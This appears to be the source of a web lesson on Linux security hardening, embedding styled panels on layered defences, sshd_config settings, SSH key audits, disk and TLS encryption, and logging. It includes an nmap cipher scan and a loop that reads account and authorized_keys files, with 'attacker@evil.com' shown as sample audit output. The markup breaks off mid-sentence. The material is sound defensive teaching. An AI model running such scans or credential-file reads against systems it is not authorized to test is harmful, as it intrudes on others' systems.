import LessonDocument from "./LessonDocument";

const styles = "@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Rajdhani:wght@400;500;600;700&display=swap');\n*{box-sizing:border-box;margin:0;padding:0}\n:root{\n  --bg:#0a0c0f;--bg3:#111820;--panel:#131a22;--panel2:#1a2332;\n  --b:#1e3a5f;--b2:#0f2540;\n  --g:#00ff88;--c:#00d4ff;--y:#ffd700;--o:#ff8c00;--r:#ff3b3b;--p:#9d4edd;--bl:#2979ff;\n  --t:#c8d8e8;--t2:#7a9bb5;--t3:#4a6a85;\n  --mono:'JetBrains Mono',monospace;--sans:'Rajdhani','Segoe UI',sans-serif;\n}\nbody{background:var(--bg);color:var(--t);font-family:var(--mono);font-size:13px;line-height:1.6;overflow-x:hidden}\nbody::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,.01) 2px,rgba(0,255,136,.01) 4px);pointer-events:none;z-index:9999}\n.wrap{max-width:1100px;margin:0 auto;padding:20px 16px}\n.panel{background:var(--panel);border:1px solid var(--b2);margin-bottom:14px;overflow:hidden}\n.ph{background:var(--panel2);border-bottom:1px solid var(--b);padding:8px 16px;display:flex;align-items:center;gap:10px}\n.pt{font-family:var(--sans);font-size:13px;font-weight:600;letter-spacing:2px;text-transform:uppercase;color:var(--c)}\n.pn{margin-left:auto;font-size:10px;color:var(--t3);letter-spacing:1px}\n.pb{padding:18px 20px}\n@keyframes pulse{0%,100%{box-shadow:0 0 6px var(--g)}50%{box-shadow:0 0 18px var(--g);opacity:.5}}\n.g2{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:14px}\n.g3{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px}\n.g4{display:grid;grid-template-columns:repeat(auto-fit,minmax(155px,1fr));gap:10px}\n.cb{background:var(--bg3);border:1px solid var(--b2);padding:14px}\n.cbl{border-left:3px solid var(--c)}.cbg{border-left:3px solid var(--g)}.cby{border-left:3px solid var(--y)}.cbp{border-left:3px solid var(--p)}.cbo{border-left:3px solid var(--o)}.cbr{border-left:3px solid var(--r)}\n.cbt{font-family:var(--sans);font-size:11px;font-weight:600;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px}\n.cbl .cbt{color:var(--c)}.cbg .cbt{color:var(--g)}.cby .cbt{color:var(--y)}.cbp .cbt{color:var(--p)}.cbo .cbt{color:var(--o)}.cbr .cbt{color:var(--r)}\n.ct{color:var(--t);font-size:12.5px;line-height:1.7}\n.term{background:#050810;border:1px solid #1a2d45;overflow:hidden}\n.tbar{background:#0d1520;border-bottom:1px solid #1a2d45;padding:7px 14px;display:flex;align-items:center;gap:8px}\n.td{width:10px;height:10px;border-radius:50%}\n.tb{padding:14px 18px;font-size:12px;line-height:1.8}\n.pr{color:var(--g)}\n.sec{display:block;color:var(--t3);font-size:10px;letter-spacing:2px;text-transform:uppercase;border-top:1px solid #1a2d45;padding-top:10px;margin:10px 0 4px}\n.out{display:block;color:var(--t2)}.ocn{display:block;color:var(--c)}.oyn{display:block;color:var(--y)}.orn{display:block;color:var(--o)}.ogn{display:block;color:var(--g)}.ored{display:block;color:var(--r)}.opu{display:block;color:var(--p)}\n.info{display:flex;gap:8px;padding:8px 12px;background:rgba(0,212,255,.06);border-left:3px solid var(--c);margin:10px 0;font-size:12px;color:var(--t2)}\n.warn{display:flex;gap:8px;padding:8px 12px;background:rgba(255,215,0,.06);border-left:3px solid var(--y);margin:10px 0;font-size:12px;color:var(--t2)}\n.good{display:flex;gap:8px;padding:8px 12px;background:rgba(0,255,136,.06);border-left:3px solid var(--g);margin:10px 0;font-size:12px;color:var(--t2)}\n.danger{display:flex;gap:8px;padding:8px 12px;background:rgba(255,59,59,.07);border-left:3px solid var(--r);margin:10px 0;font-size:12px;color:var(--t2)}\n.tbl{width:100%;border-collapse:collapse;font-size:12px}\n.tbl th{background:var(--panel2);padding:9px 12px;text-align:left;font-family:var(--sans);font-size:11px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;border-bottom:2px solid var(--b);color:var(--c)}\n.tbl td{padding:8px 12px;border-bottom:1px solid var(--b2);color:var(--t2);vertical-align:top;font-size:12px}\n.tbl td:first-child{color:var(--g);font-family:var(--mono)}\n.tbl tr:hover td{background:rgba(255,255,255,.02)}\n.tag{padding:2px 8px;border-radius:2px;font-size:10px;font-weight:600;letter-spacing:1px;text-transform:uppercase;font-family:var(--sans)}\n.tg{background:rgba(0,255,136,.12);color:var(--g);border:1px solid rgba(0,255,136,.3)}\n.tc{background:rgba(0,212,255,.1);color:var(--c);border:1px solid rgba(0,212,255,.3)}\n.ty{background:rgba(255,215,0,.1);color:var(--y);border:1px solid rgba(255,215,0,.3)}\n.tp{background:rgba(157,78,221,.12);color:var(--p);border:1px solid rgba(157,78,221,.3)}\n.to{background:rgba(255,140,0,.1);color:var(--o);border:1px solid rgba(255,140,0,.3)}\n.tr2{background:rgba(255,59,59,.1);color:var(--r);border:1px solid rgba(255,59,59,.3)}\n.cl{list-style:none}\n.cl li{padding:7px 0;border-bottom:1px solid var(--b2);font-size:12.5px;display:flex;align-items:flex-start;gap:10px;color:var(--t2)}\n.chk{width:16px;height:16px;min-width:16px;border:1px solid var(--g);background:rgba(0,255,136,.1);display:flex;align-items:center;justify-content:center;font-size:10px;color:var(--g);margin-top:1px;flex-shrink:0}\n.hl{color:var(--g);font-weight:600}.hc{color:var(--c)}.hy{color:var(--y)}.ho{color:var(--o)}.hp{color:var(--p)}.hr{color:var(--r)}\n.div{height:1px;background:linear-gradient(to right,transparent,var(--b),transparent);margin:10px 0}\n.sum-card{background:var(--bg3);border:1px solid var(--b2);padding:14px}\n.sc-l{font-family:var(--sans);font-size:10px;letter-spacing:2px;text-transform:uppercase;font-weight:600;color:var(--t3);margin-bottom:6px}\n.sc-v{font-size:12px;color:var(--t);line-height:1.6}\n.nxt{background:linear-gradient(135deg,rgba(0,255,136,.08),rgba(0,212,255,.05));border:1px solid rgba(0,255,136,.3);padding:14px 18px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;margin-top:14px}\n.nb{background:var(--bg);border:1px solid var(--b);padding:6px 16px;font-size:12px;color:var(--g);cursor:pointer;font-family:var(--mono)}\n.nb:hover{background:rgba(0,255,136,.1);border-color:var(--g)}\n/* security-specific */\n.threat-card{background:var(--bg3);border:1px solid rgba(255,59,59,.3);border-left:3px solid var(--r);padding:12px 14px;margin-bottom:8px}\n.threat-title{font-family:var(--sans);font-weight:700;font-size:12px;color:var(--r);margin-bottom:5px;display:flex;align-items:center;gap:8px}\n.threat-body{font-size:12px;color:var(--t2);line-height:1.7}\n.threat-cmd{font-size:11px;color:var(--c);background:var(--bg);padding:3px 10px;border-left:2px solid var(--c);margin-top:6px}\n.def-card{background:var(--bg3);border:1px solid rgba(0,255,136,.25);border-left:3px solid var(--g);padding:12px 14px;margin-bottom:8px}\n.def-title{font-family:var(--sans);font-weight:700;font-size:12px;color:var(--g);margin-bottom:5px}\n.def-body{font-size:12px;color:var(--t2);line-height:1.7}\n.def-cmd{font-size:11px;color:var(--g);background:var(--bg);padding:3px 10px;border-left:2px solid var(--g);margin-top:6px}\n/* severity badges */\n.sev{display:inline-block;padding:2px 7px;font-size:9px;font-family:var(--sans);font-weight:700;letter-spacing:1px;text-transform:uppercase;border-radius:2px}\n.sev-c{background:rgba(255,59,59,.2);color:var(--r);border:1px solid rgba(255,59,59,.5)}\n.sev-h{background:rgba(255,140,0,.18);color:var(--o);border:1px solid rgba(255,140,0,.5)}\n.sev-m{background:rgba(255,215,0,.15);color:var(--y);border:1px solid rgba(255,215,0,.4)}\n.sev-l{background:rgba(0,255,136,.12);color:var(--g);border:1px solid rgba(0,255,136,.4)}\n/* hardening score */\n.score-bar{height:10px;background:rgba(255,255,255,.05);margin:4px 0;overflow:hidden;position:relative}\n.score-fill{height:100%;transition:width .4s}\n.score-row{display:flex;align-items:center;gap:10px;margin:5px 0;font-size:11.5px}\n.score-lbl{width:200px;min-width:200px;color:var(--t2);font-size:11px;font-family:var(--sans)}\n.score-val{width:35px;text-align:right;font-size:11px;font-family:var(--sans);font-weight:700}\n/* ssh config lines */\n.ssh-line{display:flex;align-items:flex-start;gap:10px;padding:5px 0;border-bottom:1px solid var(--b2);font-size:12px}\n.ssh-key{width:230px;min-width:230px;color:var(--c);font-family:var(--mono)}\n.ssh-val{width:80px;min-width:80px}\n.ssh-why{flex:1;color:var(--t3);font-size:11px}\n/* attack chain */\n.atk-step{display:flex;gap:12px;align-items:flex-start;position:relative}\n.atk-line{position:absolute;left:15px;top:32px;bottom:-8px;width:1px;background:linear-gradient(to bottom,var(--r),transparent)}\n.atk-dot{width:32px;min-width:32px;height:32px;border-radius:50%;border:2px solid var(--r);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--r);background:rgba(255,59,59,.08);flex-shrink:0;font-family:var(--sans)}\n.atk-body{flex:1;background:var(--bg3);border:1px solid rgba(255,59,59,.2);padding:9px 14px;margin-bottom:10px}\n.atk-title{font-family:var(--sans);font-weight:600;font-size:12px;color:var(--r);margin-bottom:3px}\n.atk-desc{font-size:11.5px;color:var(--t2)}\n.atk-cmd{margin-top:5px;background:var(--bg);padding:3px 10px;font-size:11px;color:var(--o);border-left:2px solid var(--o)}\n/* mitre badges */\n.mitre{display:inline-block;padding:1px 6px;font-size:9px;font-family:var(--sans);font-weight:700;letter-spacing:1px;background:rgba(157,78,221,.15);color:var(--p);border:1px solid rgba(157,78,221,.4);border-radius:2px;margin-left:6px}";
const markup = "<div class=\"wrap\">\n\n<!-- HEADER -->\n<div style=\"background:linear-gradient(135deg,#0d1a2e,#0a1520);border:1px solid var(--b);border-top:3px solid var(--r);padding:20px 24px;margin-bottom:16px;position:relative;overflow:hidden\">\n  <div style=\"position:absolute;right:-60px;top:-60px;width:200px;height:200px;background:radial-gradient(circle,rgba(255,59,59,.05),transparent 70%);pointer-events:none\"></div>\n  <div style=\"display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px\">\n    <div>\n      <div style=\"display:flex;align-items:center;gap:8px;margin-bottom:6px\">\n        <div style=\"width:8px;height:8px;border-radius:50%;background:var(--r);animation:pulse 2s infinite\"></div>\n        <span style=\"font-family:var(--sans);font-size:11px;font-weight:600;letter-spacing:3px;text-transform:uppercase;color:var(--r)\">STEP 07 / MODULE 1 ● ACTIVE</span>\n      </div>\n      <h1 style=\"font-family:var(--sans);font-size:26px;font-weight:700;color:#fff;letter-spacing:1px;line-height:1.2\">Linux <span style=\"color:var(--r)\">Security</span> — Deep Understanding</h1>\n      <div style=\"display:flex;flex-wrap:wrap;gap:8px;margin-top:10px\">\n        <span class=\"tag tr2\">⚡ Advanced</span>\n        <span class=\"tag tc\">⊞ Authentication & Hardening</span>\n        <span class=\"tag ty\">⊛ Logging & Auditing</span>\n        <span class=\"tag tp\">⬡ SELinux & AppArmor</span>\n        <span class=\"tag tg\">⊕ Red / Blue Team</span>\n        <span class=\"tag to\">⊘ MITRE ATT&CK</span>\n      </div>\n    </div>\n    <div style=\"text-align:right;font-size:11px;color:var(--t3);line-height:1.9;font-family:var(--mono)\">\n      <div>MODULE: <span style=\"color:var(--c)\">security-07</span></div>\n      <div>DEPTH: <span style=\"color:var(--c)\">L6–L7</span></div>\n      <div>PANELS: <span style=\"color:var(--c)\">14</span></div>\n      <div>PREREQ: <span style=\"color:var(--c)\">Step 01–06 ✓</span></div>\n      <div style=\"margin-top:6px;font-size:10px;color:#6a1e1e\">▓▓▓▓▓▓▓▓▓▓ THREAT MODEL ACTIVE</div>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL 01 — LINUX SECURITY MODEL OVERVIEW -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🛡</span><span class=\"pt\">Linux Security Model — Defence-in-Depth Architecture</span><span class=\"pn\">PANEL 01</span></div>\n  <div class=\"pb\">\n    <div class=\"info\"><span style=\"color:var(--c);flex-shrink:0\">ℹ</span><span>Linux security is <strong style=\"color:var(--c)\">layered</strong> — no single control is sufficient. Each layer assumes the layer above it may be compromised. The goal: limit blast radius when one layer fails. This is the <strong>defence-in-depth</strong> model.</span></div>\n\n    <!-- Security layers -->\n    <div style=\"display:flex;flex-direction:column;gap:4px;margin-bottom:14px\">\n      <div style=\"background:rgba(157,78,221,.08);border:1px solid rgba(157,78,221,.3);padding:10px 16px\">\n        <div style=\"font-family:var(--sans);font-weight:700;font-size:12px;color:var(--p);margin-bottom:3px\">LAYER 7 — Monitoring & Incident Response</div>\n        <div style=\"font-size:11px;color:var(--t3)\">auditd · SIEM · AIDE · Tripwire · fail2ban · IDS/IPS · journald · alert pipelines</div>\n      </div>\n      <div style=\"text-align:center;color:var(--t3);font-size:10px\">▼</div>\n      <div style=\"background:rgba(255,140,0,.07);border:1px solid rgba(255,140,0,.3);padding:10px 16px\">\n        <div style=\"font-family:var(--sans);font-weight:700;font-size:12px;color:var(--o);margin-bottom:3px\">LAYER 6 — Network Security</div>\n        <div style=\"font-size:11px;color:var(--t3)\">nftables/iptables default-deny · fail2ban · SSH hardening · TLS · VPN · network namespaces</div>\n      </div>\n      <div style=\"text-align:center;color:var(--t3);font-size:10px\">▼</div>\n      <div style=\"background:rgba(255,215,0,.07);border:1px solid rgba(255,215,0,.3);padding:10px 16px\">\n        <div style=\"font-family:var(--sans);font-weight:700;font-size:12px;color:var(--y);margin-bottom:3px\">LAYER 5 — Mandatory Access Control (MAC)</div>\n        <div style=\"font-size:11px;color:var(--t3)\">SELinux · AppArmor · seccomp · Landlock — confine even root-owned processes</div>\n      </div>\n      <div style=\"text-align:center;color:var(--t3);font-size:10px\">▼</div>\n      <div style=\"background:rgba(0,212,255,.06);border:1px solid rgba(0,212,255,.3);padding:10px 16px\">\n        <div style=\"font-family:var(--sans);font-weight:700;font-size:12px;color:var(--c);margin-bottom:3px\">LAYER 4 — Discretionary Access Control (DAC)</div>\n        <div style=\"font-size:11px;color:var(--t3)\">rwx permissions · ACLs · SUID/SGID audit · capabilities · sudo rules · chattr +i</div>\n      </div>\n      <div style=\"text-align:center;color:var(--t3);font-size:10px\">▼</div>\n      <div style=\"background:rgba(0,255,136,.06);border:1px solid rgba(0,255,136,.3);padding:10px 16px\">\n        <div style=\"font-family:var(--sans);font-weight:700;font-size:12px;color:var(--g);margin-bottom:3px\">LAYER 3 — Identity & Authentication</div>\n        <div style=\"font-size:11px;color:var(--t3)\">PAM · SSH keys · MFA · password policy · account lockout · /etc/shadow SHA-512</div>\n      </div>\n      <div style=\"text-align:center;color:var(--t3);font-size:10px\">▼</div>\n      <div style=\"background:rgba(0,255,136,.04);border:1px solid rgba(0,255,136,.2);padding:10px 16px\">\n        <div style=\"font-family:var(--sans);font-weight:700;font-size:12px;color:var(--g2);margin-bottom:3px\">LAYER 2 — Kernel Hardening</div>\n        <div style=\"font-size:11px;color:var(--t3)\">sysctl hardening · ASLR · kptr_restrict · dmesg_restrict · Secure Boot · kernel lockdown</div>\n      </div>\n      <div style=\"text-align:center;color:var(--t3);font-size:10px\">▼</div>\n      <div style=\"background:rgba(255,215,0,.04);border:1px solid rgba(255,215,0,.2);padding:10px 16px\">\n        <div style=\"font-family:var(--sans);font-weight:700;font-size:12px;color:var(--y);margin-bottom:3px\">LAYER 1 — Supply Chain & Physical</div>\n        <div style=\"font-size:11px;color:var(--t3)\">Secure Boot · TPM · disk encryption (LUKS) · verified package signatures · CVE patch cadence</div>\n      </div>\n    </div>\n\n    <div class=\"good\"><span style=\"color:var(--g);flex-shrink:0\">✓</span><span><strong style=\"color:var(--g)\">Security principle:</strong> An attacker who breaks through Layer 3 (auth) should still be stopped by Layer 5 (MAC). An attacker who exploits a kernel bug should still be limited by Layer 6 (network). No single layer is your last line of defence.</span></div>\n  </div>\n</div>\n\n<!-- PANEL 02 — SSH HARDENING -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🔑</span><span class=\"pt\">SSH Security — Hardening sshd_config</span><span class=\"pn\">PANEL 02</span></div>\n  <div class=\"pb\">\n    <div class=\"danger\"><span style=\"color:var(--r);flex-shrink:0\">⛔</span><span>SSH is the <strong style=\"color:var(--r)\">most attacked service</strong> on Linux servers. Default config allows password auth — brute force is trivial. Most Linux server compromises begin with weak SSH credentials. Harden immediately on any new deployment.</span></div>\n\n    <!-- sshd_config breakdown -->\n    <div style=\"background:var(--bg);border:1px solid var(--b2);padding:14px;margin-bottom:14px;overflow-x:auto\">\n      <div style=\"font-family:var(--sans);font-size:10px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:10px\">/etc/ssh/sshd_config — Production Hardened Settings</div>\n      <div style=\"display:flex;font-family:var(--sans);font-size:10px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--t3);padding:4px 0;border-bottom:2px solid var(--b)\">\n        <span style=\"width:230px\">Directive</span><span style=\"width:80px\">Value</span><span>Security Reason</span>\n      </div>\n      <div class=\"ssh-line\"><span class=\"ssh-key\">Port</span><span class=\"ssh-val\" style=\"color:var(--y)\">2222</span><span class=\"ssh-why\">Non-default reduces automated scan noise. Not real security, but reduces log spam.</span></div>\n      <div class=\"ssh-line\"><span class=\"ssh-key\">PermitRootLogin</span><span class=\"ssh-val\" style=\"color:var(--r)\">no</span><span class=\"ssh-why\"><strong style=\"color:var(--r)\">Critical.</strong> Root login via SSH = direct root access if creds compromised. Use sudo instead.</span></div>\n      <div class=\"ssh-line\"><span class=\"ssh-key\">PasswordAuthentication</span><span class=\"ssh-val\" style=\"color:var(--r)\">no</span><span class=\"ssh-why\"><strong style=\"color:var(--r)\">Critical.</strong> Passwords are bruteforceable. SSH keys are not. Set before exposing to internet.</span></div>\n      <div class=\"ssh-line\"><span class=\"ssh-key\">PubkeyAuthentication</span><span class=\"ssh-val\" style=\"color:var(--g)\">yes</span><span class=\"ssh-why\">Allow SSH key login. Keys in ~/.ssh/authorized_keys.</span></div>\n      <div class=\"ssh-line\"><span class=\"ssh-key\">AuthorizedKeysFile</span><span class=\"ssh-val\" style=\"color:var(--c)\">.ssh/authorized_keys</span><span class=\"ssh-why\">Where to look for public keys. Keep permissions: 700 dir, 600 file.</span></div>\n      <div class=\"ssh-line\"><span class=\"ssh-key\">MaxAuthTries</span><span class=\"ssh-val\" style=\"color:var(--y)\">3</span><span class=\"ssh-why\">Disconnect after 3 failed attempts. Slows brute force.</span></div>\n      <div class=\"ssh-line\"><span class=\"ssh-key\">LoginGraceTime</span><span class=\"ssh-val\" style=\"color:var(--y)\">20</span><span class=\"ssh-why\">20s to complete auth. Reduces connection-hold attacks.</span></div>\n      <div class=\"ssh-line\"><span class=\"ssh-key\">MaxSessions</span><span class=\"ssh-val\" style=\"color:var(--y)\">4</span><span class=\"ssh-why\">Limit simultaneous sessions per connection.</span></div>\n      <div class=\"ssh-line\"><span class=\"ssh-key\">AllowUsers</span><span class=\"ssh-val\" style=\"color:var(--g)\">alice bob</span><span class=\"ssh-why\">Whitelist — only named users can SSH. Service accounts blocked even with valid keys.</span></div>\n      <div class=\"ssh-line\"><span class=\"ssh-key\">AllowGroups</span><span class=\"ssh-val\" style=\"color:var(--g)\">sshusers</span><span class=\"ssh-why\">Group-based whitelist. Easier to manage with many users.</span></div>\n      <div class=\"ssh-line\"><span class=\"ssh-key\">X11Forwarding</span><span class=\"ssh-val\" style=\"color:var(--r)\">no</span><span class=\"ssh-why\">X11 forwarding is an attack vector. Disable unless needed.</span></div>\n      <div class=\"ssh-line\"><span class=\"ssh-key\">AllowTcpForwarding</span><span class=\"ssh-val\" style=\"color:var(--r)\">no</span><span class=\"ssh-why\">Prevents using SSH as proxy/tunnel to bypass firewall.</span></div>\n      <div class=\"ssh-line\"><span class=\"ssh-key\">ClientAliveInterval</span><span class=\"ssh-val\" style=\"color:var(--y)\">300</span><span class=\"ssh-why\">Send keepalive every 300s. Drops stale sessions.</span></div>\n      <div class=\"ssh-line\"><span class=\"ssh-key\">ClientAliveCountMax</span><span class=\"ssh-val\" style=\"color:var(--y)\">2</span><span class=\"ssh-why\">Disconnect after 2 missed keepalives (10 min idle timeout).</span></div>\n      <div class=\"ssh-line\"><span class=\"ssh-key\">Ciphers</span><span class=\"ssh-val\" style=\"color:var(--c)\" style=\"font-size:10px\">aes256-gcm@…</span><span class=\"ssh-why\">Only allow strong ciphers. Remove 3DES, RC4, CBC-mode ciphers.</span></div>\n      <div class=\"ssh-line\"><span class=\"ssh-key\">KexAlgorithms</span><span class=\"ssh-val\" style=\"color:var(--c)\">curve25519…</span><span class=\"ssh-why\">Only modern key exchange. Remove diffie-hellman-group1/14.</span></div>\n      <div class=\"ssh-line\" style=\"border:none\"><span class=\"ssh-key\">LogLevel</span><span class=\"ssh-val\" style=\"color:var(--g)\">VERBOSE</span><span class=\"ssh-why\">Log fingerprints of keys used. Essential for forensics.</span></div>\n    </div>\n\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">SSH key management & security operations</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── GENERATE ED25519 KEY (STRONGEST) ────</span>\n        <span><span class=\"pr\">alice@lab:~$ </span><span style=\"color:#fff\">ssh-keygen -t ed25519 -C \"alice@company.com\" -f ~/.ssh/id_ed25519</span></span>\n        <span class=\"out\">Generating public/private ed25519 key pair.</span>\n        <span class=\"oyn\">Enter passphrase (empty for no passphrase): [USE A PASSPHRASE!]</span>\n        <span class=\"sec\">──── DEPLOY PUBLIC KEY TO SERVER ────</span>\n        <span><span class=\"pr\">alice@lab:~$ </span><span style=\"color:#fff\">ssh-copy-id -i ~/.ssh/id_ed25519.pub alice@server.example.com</span></span>\n        <span class=\"sec\">──── VERIFY ONLY KEY AUTH WORKS (test before disabling passwords) ────</span>\n        <span><span class=\"pr\">alice@lab:~$ </span><span style=\"color:#fff\">ssh -o PasswordAuthentication=no alice@server.example.com echo \"key auth works\"</span></span>\n        <span class=\"ogn\">key auth works</span>\n        <span class=\"sec\">──── AUDIT AUTHORIZED_KEYS (security check) ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">for u in $(awk -F: '$7!~/nologin|false/{print $1\":\"$6}' /etc/passwd); do\n  name=${u%%:*}; home=${u##*:}\n  f=\"$home/.ssh/authorized_keys\"\n  [ -f \"$f\" ] && echo \"=== $name ===\" && cat \"$f\"\ndone</span></span>\n        <span class=\"ored\">=== root ===</span>\n        <span class=\"ored\">ssh-ed25519 AAAA... attacker@evil.com  ← unauthorized key in root's authorized_keys!</span>\n        <span class=\"sec\">──── SSH AUDIT LOG (forensics) ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">grep \"Accepted\\|Failed\\|Invalid\" /var/log/auth.log | tail -10</span></span>\n        <span class=\"ogn\">Accepted publickey for alice from 192.168.1.50 port 51234 ssh2: ED25519</span>\n        <span class=\"ored\">Failed password for root from 185.234.10.5 port 43210 ssh2  ← brute force</span>\n        <span class=\"ored\">Invalid user admin from 10.10.10.5 port 52100 ssh2  ← scanning for default users</span>\n        <span class=\"sec\">──── APPLY CONFIG & RESTART ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">sshd -t && systemctl reload sshd   # test config FIRST, then reload</span></span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL 03 — ENCRYPTION -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">🔐</span><span class=\"pt\">Encryption — LUKS, TLS, GPG &amp; Data at Rest/Transit</span><span class=\"pn\">PANEL 03</span></div>\n  <div class=\"pb\">\n    <div class=\"g2\" style=\"margin-bottom:14px\">\n      <div class=\"cb cbr\">\n        <div class=\"cbt\">LUKS — Full Disk Encryption</div>\n        <div class=\"ct\">\n          <span class=\"hr\">LUKS</span> (Linux Unified Key Setup) encrypts entire block devices. Implemented in kernel via dm-crypt. Key hierarchy:<br><br>\n          <span class=\"hl\">Master Key</span> (random 256/512-bit) → encrypts the data<br>\n          <span class=\"hc\">Key Slots</span> (up to 8) → each holds an encrypted copy of master key<br>\n          <span class=\"hy\">Passphrase / keyfile / TPM</span> → unlocks a key slot → reveals master key<br><br>\n          Multiple slots = multiple unlock methods (passphrase + recovery key + TPM). Changing passphrase only changes key slot, not re-encrypting all data.\n        </div>\n      </div>\n      <div class=\"cb cbl\">\n        <div class=\"cbt\">TLS — Encryption in Transit</div>\n        <div class=\"ct\">\n          TLS (Transport Layer Security) protects data between client and server. Minimum: <span class=\"hl\">TLS 1.2</span>. Prefer: <span class=\"hl\">TLS 1.3</span> (faster handshake, no legacy crypto).<br><br>\n          <span class=\"hc\">Certificate chain:</span> Server cert → Intermediate CA → Root CA. Trust anchored in /etc/ssl/certs/<br><br>\n          <span class=\"hy\">HSTS</span> — HTTP Strict Transport Security: browser must use HTTPS.<br>\n          <span class=\"hy\">OCSP Stapling</span> — server provides cert revocation proof, no client lookup needed.\n        </div>\n      </div>\n    </div>\n\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">LUKS · TLS · GPG operations</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── LUKS — ENCRYPT A PARTITION ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">cryptsetup luksFormat --type luks2 --cipher aes-xts-plain64 --key-size 512 /dev/sdb</span></span>\n        <span class=\"oyn\">WARNING! This will overwrite data on /dev/sdb. Are you sure? YES</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">cryptsetup luksOpen /dev/sdb data_enc</span></span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">mkfs.ext4 /dev/mapper/data_enc && mount /dev/mapper/data_enc /data</span></span>\n        <span class=\"sec\">──── LUKS KEY SLOT AUDIT ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">cryptsetup luksDump /dev/sdb | grep -E \"Keyslot|cipher|key-size\"</span></span>\n        <span class=\"ocn\">Version:       2</span>\n        <span class=\"out\">Cipher:        aes-xts-plain64</span>\n        <span class=\"out\">Key-size:      512 bits</span>\n        <span class=\"ogn\">Keyslot 0:     ENABLED   (passphrase)</span>\n        <span class=\"ogn\">Keyslot 1:     ENABLED   (recovery key)</span>\n        <span class=\"out\">Keyslot 2-7:   DISABLED</span>\n        <span class=\"sec\">──── TLS CERTIFICATE AUDIT ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">openssl s_client -connect example.com:443 -brief 2>/dev/null</span></span>\n        <span class=\"ocn\">Protocol version: TLSv1.3</span>\n        <span class=\"ocn\">Ciphersuite: TLS_AES_256_GCM_SHA384</span>\n        <span class=\"out\">Peer certificate: CN=example.com</span>\n        <span class=\"out\">Hash used: SHA256</span>\n        <span class=\"ogn\">Verification: OK</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">openssl x509 -in /etc/ssl/certs/server.crt -noout -dates -subject</span></span>\n        <span class=\"out\">notBefore=Jan  1 00:00:00 2026 GMT</span>\n        <span class=\"oyn\">notAfter =Mar 31 23:59:59 2026 GMT   ← expires soon! renew!</span>\n        <span class=\"sec\">──── GPG — FILE ENCRYPTION ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">gpg --symmetric --cipher-algo AES256 sensitive.tar.gz</span></span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">gpg --decrypt sensitive.tar.gz.gpg > sensitive.tar.gz</span></span>\n        <span class=\"sec\">──── DETECT WEAK TLS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">nmap --script ssl-enum-ciphers -p 443 target.example.com | grep \"TLSv1.0\\|RC4\\|DES\"</span></span>\n        <span class=\"ored\">TLSv1.0: RC4-SHA  ← WEAK! Disable TLS 1.0 and RC4 immediately</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- PANEL 04 — LOGGING & AUDITING -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">📋</span><span class=\"pt\">Logging &amp; Auditing — auditd, journald, syslog</span><span class=\"pn\">PANEL 04</span></div>\n  <div class=\"pb\">\n    <div class=\"g2\" style=\"margin-bottom:14px\">\n      <div class=\"cb cby\">\n        <div class=\"cbt\">Linux Logging Architecture</div>\n        <div class=\"ct\" style=\"font-size:12px;line-height:1.9\">\n          <span class=\"hy\">Kernel ring buffer</span> → <code>dmesg</code> / <code>journalctl -k</code><br>\n          <span class=\"hy\">auditd</span> → kernel audit subsystem → <code>/var/log/audit/audit.log</code><br>\n          <span class=\"hy\">systemd-journald</span> → structured binary log → <code>journalctl</code><br>\n          <span class=\"hy\">rsyslog / syslog-ng</span> → route logs to files, remote, SIEM<br>\n          <span class=\"hy\">/var/log/auth.log</span> → PAM/SSH authentication events<br>\n          <span class=\"hy\">/var/log/syslog</span> → general system messages<br>\n          <span class=\"hy\">/var/log/kern.log</span> → kernel messages<br>\n          <span class=\"hy\">/var/log/audit/</span> → auditd — most comprehensive\n        </div>\n      </div>\n      <div class=\"cb cbg\">\n        <div class=\"cbt\">auditd — Kernel-Level Audit Trail</div>\n        <div class=\"ct\">\n          auditd records <span class=\"hl\">every system call, file access, network connection, process 